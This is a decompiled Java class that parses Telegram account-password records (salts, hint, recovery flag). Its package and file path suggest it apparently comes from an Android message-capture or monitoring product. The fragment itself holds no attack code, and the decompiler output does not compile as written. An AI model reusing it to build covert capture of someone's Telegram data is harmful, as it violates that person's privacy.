package com.vvt.capture.telegram.internal;

public class TLRPC$account_Password
  extends TLObject
{
  public byte[] current_salt;
  public String email_unconfirmed_pattern;
  public boolean has_recovery;
  public String hint;
  public byte[] new_salt;
  
  public static account_Password TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in account_Password", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_account_password;
      ((TLRPC.TL_account_password)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_account_noPassword;
      ((TLRPC.TL_account_noPassword)localObject).<init>();
    }
    if (localObject != null) {
      ((account_Password)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (account_Password)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$account_Password.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */